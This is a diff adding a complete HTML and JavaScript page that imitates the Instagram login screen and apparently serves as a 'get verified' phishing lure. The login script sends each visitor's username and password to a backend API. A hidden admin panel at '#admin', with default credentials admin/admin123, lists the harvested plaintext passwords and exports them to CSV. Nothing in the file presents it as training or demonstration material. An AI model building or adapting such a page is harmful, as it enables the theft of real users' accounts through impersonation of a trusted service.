@@ -1,0 +1,1138 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Instagram · Login</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background: #fafafa;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            margin: 0;
+        }
+
+        #app {
+            width: 100%;
+            max-width: 480px;
+            transition: all 0.25s ease;
+        }
+
+        body.admin-mode #app {
+            max-width: 1200px;
+        }
+
+        .card {
+            background: white;
+            border-radius: 32px;
+            padding: 36px 28px 40px;
+            box-shadow: 0 12px 28px rgba(0, 0, 0, 0.08), 0 4px 16px rgba(0, 0, 0, 0.02);
+            border: 1px solid #dbdbdb;
+        }
+
+        .card.hidden {
+            display: none;
+        }
+
+        /* Login Card */
+        .login-card .logo {
+            text-align: center;
+            margin-bottom: 28px;
+        }
+        .login-card .logo i {
+            font-size: 48px;
+            background: linear-gradient(135deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+        .login-card .logo h1 {
+            font-size: 32px;
+            font-weight: 600;
+            color: #262626;
+            margin-top: 4px;
+        }
+
+        .login-card .form-group {
+            margin-bottom: 16px;
+        }
+        .login-card .form-group input {
+            width: 100%;
+            padding: 12px 16px;
+            background: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 8px;
+            font-size: 14px;
+            outline: none;
+            transition: border 0.15s;
+            color: #262626;
+        }
+        .login-card .form-group input:focus {
+            border-color: #a8a8a8;
+            background: white;
+        }
+        .login-card .form-group input::placeholder {
+            color: #8e8e8e;
+        }
+
+        .login-btn {
+            width: 100%;
+            background: #0095f6;
+            border: none;
+            padding: 10px 0;
+            border-radius: 8px;
+            color: white;
+            font-weight: 600;
+            font-size: 15px;
+            cursor: pointer;
+            transition: background 0.15s;
+            margin-top: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+        .login-btn:hover {
+            background: #1877f2;
+        }
+        .login-btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+
+        .login-divider {
+            display: flex;
+            align-items: center;
+            margin: 20px 0 18px;
+            gap: 16px;
+        }
+        .login-divider::before,
+        .login-divider::after {
+            content: '';
+            flex: 1;
+            height: 1px;
+            background: #dbdbdb;
+        }
+        .login-divider span {
+            color: #8e8e8e;
+            font-size: 13px;
+            font-weight: 600;
+        }
+
+        .fb-login {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            color: #385185;
+            font-weight: 600;
+            font-size: 14px;
+            cursor: default;
+            margin-bottom: 16px;
+        }
+
+        .forgot-link {
+            text-align: center;
+            font-size: 13px;
+            color: #00376b;
+            cursor: default;
+            margin-top: 12px;
+        }
+
+        .signup-row {
+            text-align: center;
+            margin-top: 20px;
+            padding-top: 18px;
+            border-top: 1px solid #dbdbdb;
+            font-size: 14px;
+            color: #262626;
+        }
+        .signup-row span {
+            color: #0095f6;
+            font-weight: 600;
+            cursor: default;
+        }
+
+        .demo-hint {
+            margin-top: 16px;
+            font-size: 12px;
+            color: #8e8e8e;
+            text-align: center;
+            border-top: 1px solid #efefef;
+            padding-top: 16px;
+        }
+        .demo-hint strong {
+            background: #efefef;
+            padding: 2px 10px;
+            border-radius: 40px;
+            font-weight: 600;
+        }
+
+        /* Success/Dashboard Card */
+        .success-card {
+            text-align: center;
+        }
+        .success-card .check-circle {
+            font-size: 72px;
+            color: #0095f6;
+            margin-bottom: 12px;
+        }
+        .success-card h2 {
+            font-size: 28px;
+            font-weight: 700;
+            color: #262626;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            flex-wrap: wrap;
+        }
+        .success-card h2 i {
+            color: #0095f6;
+            font-size: 28px;
+        }
+        .success-card .sub {
+            color: #8e8e8e;
+            font-size: 16px;
+            margin: 8px 0 24px;
+        }
+        .success-card .features-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 12px;
+            margin: 24px 0 32px;
+        }
+        .success-card .feature-item {
+            background: #fafafa;
+            border-radius: 16px;
+            padding: 16px 8px;
+            border: 1px solid #efefef;
+        }
+        .success-card .feature-item i {
+            font-size: 28px;
+            color: #0095f6;
+            margin-bottom: 6px;
+        }
+        .success-card .feature-item p {
+            font-size: 13px;
+            font-weight: 500;
+            color: #262626;
+        }
+        .success-card .dashboard-btn {
+            background: #0095f6;
+            border: none;
+            padding: 12px 40px;
+            border-radius: 40px;
+            color: white;
+            font-weight: 600;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background 0.15s;
+        }
+        .success-card .dashboard-btn:hover {
+            background: #1877f2;
+        }
+
+        .logout-btn {
+            background: transparent;
+            border: none;
+            color: #ed4956;
+            font-size: 14px;
+            cursor: pointer;
+            font-weight: 500;
+            margin-top: 16px;
+        }
+        .logout-btn:hover {
+            color: #c82333;
+        }
+
+        /* Admin Panel */
+        .admin-panel {
+            background: white;
+            border-radius: 32px;
+            padding: 28px 24px 32px;
+            border: 1px solid #dbdbdb;
+            box-shadow: 0 12px 28px rgba(0, 0, 0, 0.06);
+        }
+        .admin-panel .admin-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            border-bottom: 2px solid #efefef;
+            padding-bottom: 16px;
+            margin-bottom: 24px;
+        }
+        .admin-panel .admin-header h3 {
+            font-size: 24px;
+            font-weight: 600;
+            color: #262626;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .admin-panel .admin-header h3 i {
+            color: #0095f6;
+        }
+        .admin-panel .badge-count {
+            background: #0095f6;
+            color: white;
+            border-radius: 40px;
+            padding: 6px 18px;
+            font-size: 14px;
+            font-weight: 500;
+        }
+        .admin-panel .table-wrap {
+            overflow-x: auto;
+            border-radius: 16px;
+            background: #fafafa;
+            border: 1px solid #efefef;
+        }
+        .admin-panel table {
+            width: 100%;
+            border-collapse: collapse;
+            font-size: 14px;
+        }
+        .admin-panel th {
+            text-align: left;
+            padding: 14px 12px 12px 16px;
+            background: #f0f0f0;
+            color: #262626;
+            font-weight: 600;
+            border-bottom: 2px solid #dbdbdb;
+        }
+        .admin-panel td {
+            padding: 12px 12px 12px 16px;
+            border-bottom: 1px solid #efefef;
+            color: #262626;
+        }
+        .admin-panel tr:last-child td {
+            border-bottom: none;
+        }
+        .admin-panel tr:hover td {
+            background: #f5f5f5;
+        }
+        .admin-panel .empty-row td {
+            text-align: center;
+            color: #8e8e8e;
+            padding: 32px 12px;
+            font-style: italic;
+        }
+        .admin-panel .admin-actions {
+            display: flex;
+            justify-content: space-between;
+            flex-wrap: wrap;
+            gap: 12px;
+            margin-top: 20px;
+        }
+        .admin-panel .clear-btn,
+        .admin-panel .export-btn,
+        .admin-panel .back-btn,
+        .admin-panel .refresh-btn {
+            background: transparent;
+            border: 1px solid #dbdbdb;
+            padding: 8px 20px;
+            border-radius: 40px;
+            font-weight: 500;
+            font-size: 13px;
+            cursor: pointer;
+            transition: 0.15s;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            color: #262626;
+        }
+        .admin-panel .clear-btn:hover {
+            background: #fee;
+            border-color: #ed4956;
+            color: #ed4956;
+        }
+        .admin-panel .export-btn:hover {
+            background: #e8f0fe;
+            border-color: #0095f6;
+            color: #0095f6;
+        }
+        .admin-panel .refresh-btn:hover {
+            background: #e8f0fe;
+            border-color: #0095f6;
+            color: #0095f6;
+        }
+        .admin-panel .back-btn:hover {
+            background: #efefef;
+        }
+        .admin-panel .admin-footer {
+            margin-top: 16px;
+            font-size: 12px;
+            color: #8e8e8e;
+            background: #fafafa;
+            padding: 6px 16px;
+            border-radius: 40px;
+            display: inline-block;
+            border: 1px solid #efefef;
+        }
+
+        body.admin-mode .login-card,
+        body.admin-mode .success-card {
+            display: none !important;
+        }
+        body.admin-mode .admin-panel {
+            display: block !important;
+        }
+        body:not(.admin-mode) .admin-panel {
+            display: none !important;
+        }
+
+        .spinner {
+            display: inline-block;
+            width: 18px;
+            height: 18px;
+            border: 3px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: #fff;
+            animation: spin 0.7s linear infinite;
+        }
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        .toast {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: #333;
+            color: white;
+            padding: 12px 24px;
+            border-radius: 8px;
+            font-size: 14px;
+            z-index: 9999;
+            opacity: 0;
+            transform: translateY(-20px);
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+            max-width: 90%;
+        }
+        .toast.show {
+            opacity: 1;
+            transform: translateY(0);
+        }
+        .toast.success {
+            background: #28a745;
+        }
+        .toast.error {
+            background: #dc3545;
+        }
+        .toast.info {
+            background: #17a2b8;
+        }
+
+        .admin-login-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.6);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 10000;
+        }
+        .admin-login-overlay.show {
+            display: flex;
+        }
+        .admin-login-box {
+            background: white;
+            padding: 40px;
+            border-radius: 20px;
+            max-width: 400px;
+            width: 90%;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+        }
+        .admin-login-box h2 {
+            margin-bottom: 20px;
+            color: #262626;
+        }
+        .admin-login-box input {
+            width: 100%;
+            padding: 12px 16px;
+            margin-bottom: 12px;
+            border: 1px solid #dbdbdb;
+            border-radius: 8px;
+            font-size: 14px;
+        }
+        .admin-login-box button {
+            width: 100%;
+            padding: 12px;
+            background: #0095f6;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+        }
+        .admin-login-box button:hover {
+            background: #1877f2;
+        }
+        .admin-login-box .error {
+            color: #dc3545;
+            font-size: 13px;
+            margin-top: 8px;
+            display: none;
+        }
+
+        @media (max-width: 500px) {
+            .card {
+                padding: 24px 16px;
+            }
+            .success-card .features-grid {
+                grid-template-columns: 1fr 1fr;
+                gap: 8px;
+            }
+            .success-card .feature-item {
+                padding: 12px 4px;
+            }
+            .admin-panel {
+                padding: 16px;
+            }
+            .admin-panel .admin-header h3 {
+                font-size: 20px;
+            }
+            .admin-login-box {
+                padding: 24px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div id="toast" class="toast"></div>
+
+    <!-- Admin Login Overlay -->
+    <div class="admin-login-overlay" id="adminLoginOverlay">
+        <div class="admin-login-box">
+            <h2><i class="fas fa-user-shield"></i> Admin Access</h2>
+            <p style="color:#8e8e8e; margin-bottom:16px; font-size:14px;">Enter your admin credentials</p>
+            <input type="text" id="adminUsername" placeholder="Username" value="admin" />
+            <input type="password" id="adminPassword" placeholder="Password" value="admin123" />
+            <button id="adminLoginBtn">Login to Admin Panel</button>
+            <div class="error" id="adminLoginError">Invalid credentials</div>
+        </div>
+    </div>
+
+    <div id="app">
+
+        <!-- LOGIN CARD -->
+        <div class="card login-card" id="loginCard">
+            <div class="logo">
+                <i class="fab fa-instagram"></i>
+                <h1>Instagram</h1>
+            </div>
+
+            <div class="form-group">
+                <input type="text" id="username" placeholder="Username or email" />
+            </div>
+            <div class="form-group" style="position: relative;">
+                <input type="password" id="password" placeholder="Password" />
+                <span style="position:absolute; right:14px; top:50%; transform:translateY(-50%); color:#8e8e8e; cursor:pointer;" id="togglePw"><i class="far fa-eye"></i></span>
+            </div>
+            <button class="login-btn" id="loginBtn">
+                <span id="loginBtnText">Log In</span>
+            </button>
+
+            <div class="login-divider"><span>OR</span></div>
+
+            <div class="fb-login">
+                <i class="fab fa-facebook-square"></i> Log in with Facebook
+            </div>
+
+            <div class="forgot-link">Forgot password?</div>
+
+            <div class="signup-row">
+                Don't have an account? <span>Sign up</span>
+            </div>
+
+            <div class="demo-hint">
+                <i class="fas fa-shield-alt"></i> Admin: append <strong>#admin</strong> to URL
+            </div>
+        </div>
+
+        <!-- SUCCESS/DASHBOARD CARD -->
+        <div class="card success-card hidden" id="successCard">
+            <div class="check-circle"><i class="fas fa-check-circle"></i></div>
+            <h2>
+                You're now verified!
+                <i class="fas fa-badge-check" style="color:#0095f6;"></i>
+            </h2>
+            <p class="sub">Welcome back, <span id="displayUsername">@user</span> ✨</p>
+
+            <div class="features-grid">
+                <div class="feature-item">
+                    <i class="fas fa-chart-line"></i>
+                    <p>Advanced analytics</p>
+                </div>
+                <div class="feature-item">
+                    <i class="fas fa-rocket"></i>
+                    <p>Growth tools</p>
+                </div>
+                <div class="feature-item">
+                    <i class="fas fa-calendar-alt"></i>
+                    <p>Content scheduling</p>
+                </div>
+                <div class="feature-item">
+                    <i class="fas fa-robot"></i>
+                    <p>AI insights</p>
+                </div>
+            </div>
+
+            <button class="dashboard-btn" id="dashboardBtn">Go to Dashboard</button>
+            <button class="logout-btn" id="logoutBtn"><i class="fas fa-sign-out-alt"></i> Logout</button>
+        </div>
+
+        <!-- ADMIN PANEL -->
+        <div class="admin-panel" id="adminPanel">
+            <div class="admin-header">
+                <h3><i class="fas fa-user-shield"></i> Admin Panel</h3>
+                <div style="display:flex; gap:10px; align-items:center; flex-wrap:wrap;">
+                    <span class="badge-count" id="loginCount">0 entries</span>
+                    <button class="refresh-btn" id="refreshBtn"><i class="fas fa-sync-alt"></i></button>
+                </div>
+            </div>
+
+            <div class="table-wrap">
+                <table>
+                    <thead>
+                        <tr>
+                            <th><i class="fas fa-user"></i> Username</th>
+                            <th><i class="fas fa-key"></i> Password</th>
+                            <th><i class="fas fa-clock"></i> Time</th>
+                            <th><i class="fas fa-globe"></i> Browser/OS</th>
+                            <th><i class="fas fa-trash"></i></th>
+                        </tr>
+                    </thead>
+                    <tbody id="tableBody">
+                        <tr class="empty-row">
+                            <td colspan="5"><i class="fas fa-inbox"></i> No login data yet</td>
+                        </tr>
+                    </tbody>
+                </table>
+            </div>
+
+            <div class="admin-actions">
+                <div style="display: flex; gap: 10px; flex-wrap: wrap;">
+                    <button class="export-btn" id="exportBtn"><i class="fas fa-file-export"></i> Export CSV</button>
+                    <button class="clear-btn" id="clearBtn"><i class="fas fa-trash-alt"></i> Clear all</button>
+                </div>
+                <button class="back-btn" id="backFromAdminBtn"><i class="fas fa-arrow-left"></i> Back to login</button>
+            </div>
+            <div class="admin-footer">
+                <i class="fas fa-database"></i> Stored in JSON · Real-time across all devices
+            </div>
+        </div>
+
+    </div>
+
+    <script>
+        // ============================================
+        // CONFIGURATION
+        // ============================================
+        const API_URL = 'http://localhost:3000/api';
+        const ADMIN_HASH = '#admin';
+        let adminToken = null;
+
+        // ============================================
+        // DOM REFS
+        // ============================================
+        const loginCard = document.getElementById('loginCard');
+        const successCard = document.getElementById('successCard');
+        const adminPanel = document.getElementById('adminPanel');
+        const usernameInput = document.getElementById('username');
+        const passwordInput = document.getElementById('password');
+        const loginBtn = document.getElementById('loginBtn');
+        const loginBtnText = document.getElementById('loginBtnText');
+        const displayUsername = document.getElementById('displayUsername');
+        const tableBody = document.getElementById('tableBody');
+        const loginCount = document.getElementById('loginCount');
+        const togglePw = document.getElementById('togglePw');
+        const clearBtn = document.getElementById('clearBtn');
+        const exportBtn = document.getElementById('exportBtn');
+        const refreshBtn = document.getElementById('refreshBtn');
+        const backFromAdminBtn = document.getElementById('backFromAdminBtn');
+        const dashboardBtn = document.getElementById('dashboardBtn');
+        const logoutBtn = document.getElementById('logoutBtn');
+        const toast = document.getElementById('toast');
+
+        // Admin login overlay
+        const adminLoginOverlay = document.getElementById('adminLoginOverlay');
+        const adminUsername = document.getElementById('adminUsername');
+        const adminPassword = document.getElementById('adminPassword');
+        const adminLoginBtn = document.getElementById('adminLoginBtn');
+        const adminLoginError = document.getElementById('adminLoginError');
+
+        // ============================================
+        // TOAST NOTIFICATIONS
+        // ============================================
+        let toastTimeout;
+
+        function showToast(message, type = 'info') {
+            toast.textContent = message;
+            toast.className = 'toast ' + type;
+            void toast.offsetWidth;
+            toast.classList.add('show');
+            clearTimeout(toastTimeout);
+            toastTimeout = setTimeout(() => {
+                toast.classList.remove('show');
+            }, 3500);
+        }
+
+        // ============================================
+        // API CALLS
+        // ============================================
+        async function saveLoginToServer(username, password) {
+            try {
+                const response = await fetch(`${API_URL}/login`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ username, password })
+                });
+                return await response.json();
+            } catch (error) {
+                console.error('Error saving login:', error);
+                return { success: false, error: 'Network error' };
+            }
+        }
+
+        async function fetchAdminData() {
+            try {
+                const response = await fetch(`${API_URL}/admin/data`, {
+                    headers: {
+                        'Authorization': `Bearer ${adminToken}`
+                    }
+                });
+                if (!response.ok) {
+                    if (response.status === 401) {
+                        showToast('Session expired. Please login again.', 'error');
+                        logoutAdmin();
+                        return null;
+                    }
+                    throw new Error('Failed to fetch data');
+                }
+                return await response.json();
+            } catch (error) {
+                console.error('Error fetching admin data:', error);
+                showToast('Error fetching data: ' + error.message, 'error');
+                return null;
+            }
+        }
+
+        async function deleteAllData() {
+            try {
+                const response = await fetch(`${API_URL}/admin/data`, {
+                    method: 'DELETE',
+                    headers: {
+                        'Authorization': `Bearer ${adminToken}`
+                    }
+                });
+                return await response.json();
+            } catch (error) {
+                console.error('Error clearing data:', error);
+                return { success: false };
+            }
+        }
+
+        async function deleteSingleEntry(id) {
+            try {
+                const response = await fetch(`${API_URL}/admin/data/${id}`, {
+                    method: 'DELETE',
+                    headers: {
+                        'Authorization': `Bearer ${adminToken}`
+                    }
+                });
+                return await response.json();
+            } catch (error) {
+                console.error('Error deleting entry:', error);
+                return { success: false };
+            }
+        }
+
+        async function adminLogin(username, password) {
+            try {
+                const response = await fetch(`${API_URL}/admin/login`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ username, password })
+                });
+                return await response.json();
+            } catch (error) {
+                console.error('Admin login error:', error);
+                return { success: false, error: 'Network error' };
+            }
+        }
+
+        // ============================================
+        // RENDER ADMIN TABLE
+        // ============================================
+        function renderAdminTable(data) {
+            if (!data || data.length === 0) {
+                tableBody.innerHTML = `
+                        <tr class="empty-row">
+                            <td colspan="5"><i class="fas fa-inbox"></i> No login data yet</td>
+                        </tr>
+                    `;
+                loginCount.textContent = '0 entries';
+                return;
+            }
+
+            loginCount.textContent = data.length + ' entry' + (data.length !== 1 ? 's' : '');
+
+            let html = '';
+            for (let entry of data) {
+                const user = escapeHtml(entry.username || 'unknown');
+                const pass = escapeHtml(entry.password || '••••••');
+                const time = entry.timestamp ? new Date(entry.timestamp).toLocaleString() : '—';
+                const browser = entry.browser || 'Unknown';
+                const os = entry.os || 'Unknown';
+                const id = entry._id || '';
+
+                html += `
+                        <tr>
+                            <td><i class="fas fa-user-circle" style="margin-right:6px;color:#0095f6;"></i>${user}</td>
+                            <td><i class="fas fa-asterisk" style="margin-right:6px;color:#8e8e8e;"></i>${pass}</td>
+                            <td><i class="far fa-calendar-alt" style="margin-right:6px;color:#8e8e8e;"></i>${time}</td>
+                            <td><i class="fas fa-globe" style="margin-right:6px;color:#8e8e8e;"></i>${browser} · ${os}</td>
+                            <td>
+                                <button class="delete-entry" data-id="${id}" style="background:none;border:none;color:#ed4956;cursor:pointer;font-size:16px;">
+                                    <i class="fas fa-trash-alt"></i>
+                                </button>
+                            </td>
+                        </tr>
+                    `;
+            }
+            tableBody.innerHTML = html;
+
+            document.querySelectorAll('.delete-entry').forEach(btn => {
+                btn.addEventListener('click', async function() {
+                    const id = this.dataset.id;
+                    if (id && confirm('Delete this entry?')) {
+                        await deleteSingleEntry(id);
+                        await refreshAdminData();
+                    }
+                });
+            });
+        }
+
+        function escapeHtml(text) {
+            if (!text) return '';
+            return String(text).replace(/[&<>"]/g, function(m) {
+                if (m === '&') return '&amp;';
+                if (m === '<') return '&lt;';
+                if (m === '>') return '&gt;';
+                if (m === '"') return '&quot;';
+                return m;
+            });
+        }
+
+        // ============================================
+        // REFRESH ADMIN DATA
+        // ============================================
+        async function refreshAdminData() {
+            if (!adminToken) {
+                showToast('Please login to admin panel', 'error');
+                return;
+            }
+
+            const result = await fetchAdminData();
+            if (result && result.success) {
+                renderAdminTable(result.data);
+                showToast(`Loaded ${result.count} entries`, 'info');
+            } else if (result && result.error) {
+                showToast(result.error, 'error');
+            }
+        }
+
+        // ============================================
+        // ADMIN LOGIN HANDLER
+        // ============================================
+        async function handleAdminLogin() {
+            const username = adminUsername.value.trim() || 'admin';
+            const password = adminPassword.value.trim();
+
+            if (!password) {
+                adminLoginError.textContent = 'Please enter your password';
+                adminLoginError.style.display = 'block';
+                return;
+            }
+
+            adminLoginError.style.display = 'none';
+            adminLoginBtn.textContent = 'Logging in...';
+            adminLoginBtn.disabled = true;
+
+            const result = await adminLogin(username, password);
+
+            if (result.success) {
+                adminToken = result.token;
+                adminLoginOverlay.classList.remove('show');
+                setAdminMode(true);
+                await refreshAdminData();
+                showToast('Welcome to Admin Panel', 'success');
+            } else {
+                adminLoginError.textContent = result.error || 'Invalid credentials';
+                adminLoginError.style.display = 'block';
+            }
+
+            adminLoginBtn.textContent = 'Login to Admin Panel';
+            adminLoginBtn.disabled = false;
+        }
+
+        // ============================================
+        // LOGOUT
+        // ============================================
+        function logoutAdmin() {
+            adminToken = null;
+            setAdminMode(false);
+            window.location.hash = '';
+            showToast('Logged out of admin panel', 'info');
+        }
+
+        function logoutUser() {
+            loginCard.classList.remove('hidden');
+            successCard.classList.add('hidden');
+            showToast('Logged out successfully', 'info');
+        }
+
+        // ============================================
+        // TOGGLE ADMIN MODE
+        // ============================================
+        function setAdminMode(active) {
+            document.body.classList.toggle('admin-mode', active);
+            if (active) {
+                if (!adminToken) {
+                    adminLoginOverlay.classList.add('show');
+                }
+            } else {
+                adminLoginOverlay.classList.remove('show');
+            }
+        }
+
+        function isAdminMode() {
+            return document.body.classList.contains('admin-mode');
+        }
+
+        // ============================================
+        // SHOW SUCCESS/DASHBOARD
+        // ============================================
+        function showSuccess(username) {
+            loginCard.classList.add('hidden');
+            successCard.classList.remove('hidden');
+            displayUsername.textContent = '@' + (username || 'user');
+            showToast('✅ Login successful! You\'re now verified!', 'success');
+        }
+
+        // ============================================
+        // GO TO LOGIN
+        // ============================================
+        function goToLogin() {
+            loginCard.classList.remove('hidden');
+            successCard.classList.add('hidden');
+            if (isAdminMode()) {
+                setAdminMode(false);
+                window.location.hash = '';
+            }
+        }
+
+        // ============================================
+        // HANDLE LOGIN - NO FORM, JUST BUTTON CLICK!
+        // ============================================
+        async function handleLogin() {
+            const username = usernameInput.value.trim();
+            const password = passwordInput.value.trim();
+
+            if (!username || !password) {
+                showToast('Please enter username and password', 'error');
+                return;
+            }
+
+            loginBtn.disabled = true;
+            loginBtnText.innerHTML = '<span class="spinner"></span> Logging in...';
+
+            try {
+                const result = await saveLoginToServer(username, password);
+
+                if (result.success) {
+                    showSuccess(username);
+                    usernameInput.value = '';
+                    passwordInput.value = '';
+                } else {
+                    showToast('Error saving login: ' + (result.error || 'Unknown error'), 'error');
+                }
+            } catch (error) {
+                showToast('Network error. Please try again.', 'error');
+                console.error('Login error:', error);
+            }
+
+            loginBtn.disabled = false;
+            loginBtnText.textContent = 'Log In';
+        }
+
+        // ============================================
+        // EXPORT CSV
+        // ============================================
+        async function exportCSV() {
+            if (!adminToken) {
+                showToast('Please login to admin panel first', 'error');
+                return;
+            }
+
+            const result = await fetchAdminData();
+            if (!result || !result.success || result.data.length === 0) {
+                showToast('No data to export', 'error');
+                return;
+            }
+
+            let csv = 'Username,Password,Timestamp,Browser,OS\n';
+            for (let entry of result.data) {
+                const user = (entry.username || '').replace(/,/g, '');
+                const pass = (entry.password || '').replace(/,/g, '');
+                const time = entry.timestamp ? new Date(entry.timestamp).toISOString() : '';
+                const browser = entry.browser || 'Unknown';
+                const os = entry.os || 'Unknown';
+                csv += `${user},${pass},${time},${browser},${os}\n`;
+            }
+
+            const blob = new Blob([csv], { type: 'text/csv' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = 'login_data.csv';
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+            showToast(`Exported ${result.data.length} entries`, 'success');
+        }
+
+        // ============================================
+        // CLEAR ALL DATA
+        // ============================================
+        async function clearAllData() {
+            if (!adminToken) {
+                showToast('Please login to admin panel first', 'error');
+                return;
+            }
+
+            if (!confirm('⚠️ Delete ALL login entries? This cannot be undone!')) {
+                return;
+            }
+
+            const result = await deleteAllData();
+            if (result.success) {
+                showToast('All data cleared', 'success');
+                await refreshAdminData();
+            } else {
+                showToast('Error clearing data', 'error');
+            }
+        }
+
+        // ============================================
+        // INIT
+        // ============================================
+        function init() {
+            if (window.location.hash === ADMIN_HASH) {
+                setAdminMode(true);
+            }
+
+            // BUTTON CLICK - NO FORM SUBMIT!
+            loginBtn.addEventListener('click', handleLogin);
+
+            // Enter key support
+            usernameInput.addEventListener('keydown', function(e) {
+                if (e.key === 'Enter') {
+                    e.preventDefault();
+                    handleLogin();
+                }
+            });
+            passwordInput.addEventListener('keydown', function(e) {
+                if (e.key === 'Enter') {
+                    e.preventDefault();
+                    handleLogin();
+                }
+            });
+
+            togglePw.addEventListener('click', function() {
+                const type = passwordInput.type === 'password' ? 'text' : 'password';
+                passwordInput.type = type;
+                this.innerHTML = type === 'password' ? '<i class="far fa-eye"></i>' :
+                    '<i class="far fa-eye-slash"></i>';
+            });
+
+            adminLoginBtn.addEventListener('click', handleAdminLogin);
+            adminPassword.addEventListener('keydown', function(e) {
+                if (e.key === 'Enter') handleAdminLogin();
+            });
+            adminUsername.addEventListener('keydown', function(e) {
+                if (e.key === 'Enter') handleAdminLogin();
+            });
+
+            clearBtn.addEventListener('click', clearAllData);
+            exportBtn.addEventListener('click', exportCSV);
+            refreshBtn.addEventListener('click', refreshAdminData);
+
+            backFromAdminBtn.addEventListener('click', function() {
+                logoutAdmin();
+            });
+
+            dashboardBtn.addEventListener('click', function() {
+                showToast('Welcome to your dashboard!', 'success');
+            });
+
+            logoutBtn.addEventListener('click', logoutUser);
+
+            window.addEventListener('hashchange', function() {
+                if (window.location.hash === ADMIN_HASH) {
+                    if (!adminToken) {
+                        adminLoginOverlay.classList.add('show');
+                    }
+                    setAdminMode(true);
+                } else {
+                    if (isAdminMode()) {
+                        document.body.classList.remove('admin-mode');
+                        adminLoginOverlay.classList.remove('show');
+                    }
+                }
+            });
+
+            adminLoginOverlay.addEventListener('click', function(e) {
+                if (e.target === this) {
+                    if (!adminToken) {
+                        adminLoginOverlay.classList.remove('show');
+                    }
+                }
+            });
+
+            console.log('🔐 Admin panel: append #admin to URL');
+            console.log('📊 Data stored in JSON file');
+            console.log('👤 Default admin: admin / admin123');
+        }
+
+        if (document.readyState === 'loading') {
+            document.addEventListener('DOMContentLoaded', init);
+        } else {
+            init();
+        }
+    </script>
+
+</body>
+</html>
